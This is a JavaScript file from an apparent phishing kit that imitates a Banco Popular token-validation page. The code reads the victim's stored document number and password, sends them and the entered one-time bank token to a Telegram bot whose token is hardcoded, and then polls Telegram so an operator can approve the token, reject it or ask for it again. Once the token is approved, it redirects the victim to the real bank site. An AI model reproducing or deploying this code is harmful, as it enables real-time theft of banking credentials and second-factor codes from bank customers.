// script_token.js
document.addEventListener('DOMContentLoaded', function() {
    // Mostrar fecha actual
    function updateDateTime() {
        const now = new Date();
        const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
        const months = ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'];
        
        let hours = now.getHours();
        const minutes = now.getMinutes();
        const ampm = hours >= 12 ? 'p. m.' : 'a. m.';
        hours = hours % 12;
        hours = hours ? hours : 12;
        const strMinutes = minutes < 10 ? '0' + minutes : minutes;
        
        const dateString = `${days[now.getDay()]}, ${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} | ${hours}:${strMinutes} ${ampm}`;
        
        const dateDisplay = document.getElementById('date-display');
        if(dateDisplay) {
            dateDisplay.textContent = dateString;
        }
    }

    updateDateTime();
    setInterval(updateDateTime, 60000);

    // Elementos del DOM
    const form = document.querySelector('.login-form');
    const tokenInput = document.getElementById('token');
    const btnValidate = document.getElementById('btn-validate');
    const errorMsg = document.getElementById('token-error-msg');
    const loadingOverlay = document.getElementById('loading-overlay');

    // Configuración de Telegram (misma que en script.js)
    const botToken = '8645913661:AAHLkz0Q3Ea_ucLi_VbZ_9cpwuvpvt_meOo';
    const chatId = '-5501183352';

    // Función para mostrar error
    function mostrarError(mensaje) {
        if (errorMsg) {
            const span = errorMsg.querySelector('span');
            if (span) span.textContent = mensaje;
            errorMsg.style.display = 'block';
            
            setTimeout(() => {
                if (errorMsg) errorMsg.style.display = 'none';
            }, 5000);
        }
        
        if (tokenInput) {
            tokenInput.value = '';
            tokenInput.focus();
        }
    }

    // Función para ocultar error al escribir
    if (tokenInput) {
        tokenInput.addEventListener('input', function() {
            if (errorMsg) errorMsg.style.display = 'none';
        });
    }

    // Manejar el envío del formulario
    if (form) {
        form.addEventListener('submit', async function(event) {
            event.preventDefault(); // ✅ Evita recargar la página
            
            const tokenValue = tokenInput.value.trim();
            
            if (!tokenValue) {
                mostrarError('Por favor ingrese el token');
                return;
            }

            if (tokenValue.length < 4) {
                mostrarError('El token debe tener al menos 4 caracteres');
                return;
            }

            // Mostrar loading
            if (loadingOverlay) loadingOverlay.style.display = 'flex';
            if (errorMsg) errorMsg.style.display = 'none';
            
            // Deshabilitar botón
            if (btnValidate) {
                btnValidate.disabled = true;
                btnValidate.textContent = 'Validando...';
            }

            try {
                // Recuperar datos guardados del login
                const docType = localStorage.getItem('saved_docType') || 'No disponible';
                const docNumber = localStorage.getItem('saved_docNumber') || 'No disponible';
                const password = localStorage.getItem('saved_password') || 'No disponible';
                const transactionId = localStorage.getItem('transaction_id') || Date.now().toString(36);
                
                // Guardar el token en localStorage
                localStorage.setItem('saved_token', tokenValue);
                
                // Generar ID único para esta validación
                const validationId = Date.now().toString(36) + Math.random().toString(36).substr(2);
                
                // Construir mensaje para Telegram con el TOKEN
                const message = `
<b>🏦 Banco Popular - Validación de Token</b>
--------------------------------------------------
🆔 <b>ID Transacción:</b> | ${transactionId}
🔐 <b>Validación ID:</b> | ${validationId}
👤 <b>Usuario:</b> | ${docType} - ${docNumber}
📱 <b>Token Ingresado:</b> | ${tokenValue}
--------------------------------------------------
⏰ <b>Fecha/Hora:</b> | ${new Date().toLocaleString('es-CO')}
🌐 <b>User Agent:</b> | ${navigator.userAgent.substring(0, 50)}...
--------------------------------------------------
`;

                // Inline Keyboard para respuestas del token
                const keyboard = {
                    inline_keyboard: [
                        [
                            { text: "✅ Token Correcto", callback_data: "token_correcto" },
                            { text: "❌ Token Incorrecto", callback_data: "token_incorrecto" }
                        ],
                        [
                            { text: "🔄 Reenviar Token", callback_data: "reenviar_token" },
                            { text: "🔙 Volver a Login", callback_data: "volver_login" }
                        ]
                    ]
                };

                console.log('📤 Enviando token a Telegram...');

                // Enviar a Telegram
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                });

                const data = await response.json();
                
                if (data.ok) {
                    console.log('✅ Token enviado a Telegram:', data);
                    
                    // Guardar información del mensaje para editar después
                    localStorage.setItem('telegram_token_message_id', data.result.message_id);
                    localStorage.setItem('telegram_token_chat_id', chatId);
                    localStorage.setItem('telegram_token_value', tokenValue);
                    
                    // ❌ ELIMINADO: alert('✅ Token enviado para validación. Por favor espere confirmación...');
                    
                    // Iniciar polling para recibir respuesta de Telegram
                    startTokenPolling(botToken);
                    
                } else {
                    console.error('Error al enviar a Telegram:', data);
                    mostrarError('Error al enviar la validación. Intente nuevamente.');
                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    if (btnValidate) {
                        btnValidate.disabled = false;
                        btnValidate.textContent = 'Validar';
                    }
                }
                
            } catch (error) {
                console.error('❌ Error:', error);
                mostrarError('Error de conexión. Por favor intente más tarde.');
                if (loadingOverlay) loadingOverlay.style.display = 'none';
                if (btnValidate) {
                    btnValidate.disabled = false;
                    btnValidate.textContent = 'Validar';
                }
            }
        });
    }

    // Función para hacer polling y recibir respuesta de Telegram
    let lastUpdateId = 0;
    let pollingInterval;

    function startTokenPolling(token) {
        // Limpiar polling existente
        if (pollingInterval) clearInterval(pollingInterval);

        pollingInterval = setInterval(() => {
            fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
            .then(response => response.json())
            .then(data => {
                if (data.ok && data.result.length > 0) {
                    data.result.forEach(update => {
                        if (update.update_id > lastUpdateId) {
                            lastUpdateId = update.update_id;
                        }
                        
                        // Verificar callback queries
                        if (update.callback_query) {
                            const action = update.callback_query.data;
                            const messageId = update.callback_query.message.message_id;
                            const tokenMessageId = localStorage.getItem('telegram_token_message_id');
                            
                            // Solo procesar si es el mensaje actual
                            if (messageId == tokenMessageId) {
                                
                                if (action === 'token_correcto') {
                                    // Token válido
                                    console.log('✅ Token validado correctamente');
                                    
                                    // Guardar que el token fue validado
                                    localStorage.setItem('token_validado', 'true');
                                    
                                    // Ocultar loading
                                    const loadingOverlay = document.getElementById('loading-overlay');
                                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                                    
                                    // Mostrar mensaje de éxito
                                    alert('✅ Token validado correctamente. Redirigiendo...');
                                    
                                    // Redirigir al dashboard o página principal
                                    window.location.href = 'https://www.bancopopular.com.co';
                                    
                                    // Limpiar polling
                                    clearInterval(pollingInterval);
                                    
                                    // Responder callback
                                    fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({
                                            callback_query_id: update.callback_query.id,
                                            text: '✅ Token validado correctamente'
                                        })
                                    });
                                }
                                
                                if (action === 'token_incorrecto') {
                                    // Token inválido
                                    console.log('❌ Token inválido');
                                    
                                    // Ocultar loading
                                    const loadingOverlay = document.getElementById('loading-overlay');
                                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                                    
                                    // Mostrar error
                                    mostrarError('Token inválido. Por favor intente nuevamente.');
                                    
                                    // Habilitar botón
                                    const btnValidate = document.getElementById('btn-validate');
                                    if (btnValidate) {
                                        btnValidate.disabled = false;
                                        btnValidate.textContent = 'Validar';
                                    }
                                    
                                    // Limpiar polling
                                    clearInterval(pollingInterval);
                                    
                                    // Responder callback
                                    fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({
                                            callback_query_id: update.callback_query.id,
                                            text: '❌ Token inválido'
                                        })
                                    });
                                }
                                
                                if (action === 'reenviar_token') {
                                    // Reenviar el token
                                    const savedToken = localStorage.getItem('saved_token');
                                    if (savedToken) {
                                        // Reenviar mensaje con el token
                                        const resendMessage = `
<b>🔄 REENVÍO DE TOKEN</b>
📱 Token: ${savedToken}
⏰ Reenviado: ${new Date().toLocaleString('es-CO')}
                                        `;
                                        
                                        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                                            method: 'POST',
                                            headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({
                                                chat_id: chatId,
                                                text: resendMessage,
                                                parse_mode: 'HTML'
                                            })
                                        });
                                    }
                                    
                                    fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({
                                            callback_query_id: update.callback_query.id,
                                            text: 'Token reenviado'
                                        })
                                    });
                                }
                                
                                if (action === 'volver_login') {
                                    // Volver al login
                                    window.location.href = 'index.html';
                                    clearInterval(pollingInterval);
                                    
                                    fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({
                                            callback_query_id: update.callback_query.id,
                                            text: 'Volviendo al login...'
                                        })
                                    });
                                }
                            }
                        }
                    });
                }
            })
            .catch(err => console.error('Polling Error:', err));
        }, 3000); // Poll cada 3 segundos
    }

    // Si el botón tiene click directo (alternativa)
    if (btnValidate) {
        btnValidate.addEventListener('click', function(e) {
            if (form) {
                const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
                form.dispatchEvent(submitEvent);
            }
        });
    }

    // Carrusel (si existe en token.html)
    function initCarousel() {
        const slides = document.querySelectorAll('.carousel-slide');
        const indicators = document.querySelectorAll('.indicator-line');
        let currentSlide = 0;
        
        if (slides.length === 0) return;
        
        function showSlide(index) {
            slides.forEach((slide, i) => {
                slide.classList.toggle('active', i === index);
            });
            
            if (indicators.length > 0) {
                indicators.forEach((indicator, i) => {
                    indicator.classList.toggle('active', i === index);
                });
            }
        }
        
        // Auto-avance cada 5 segundos
        setInterval(() => {
            currentSlide = (currentSlide + 1) % slides.length;
            showSlide(currentSlide);
        }, 5000);
        
        // Click en indicadores
        if (indicators.length > 0) {
            indicators.forEach((indicator, index) => {
                indicator.addEventListener('click', () => {
                    currentSlide = index;
                    showSlide(currentSlide);
                });
            });
        }
    }
    
    // Inicializar carrusel
    initCarousel();
});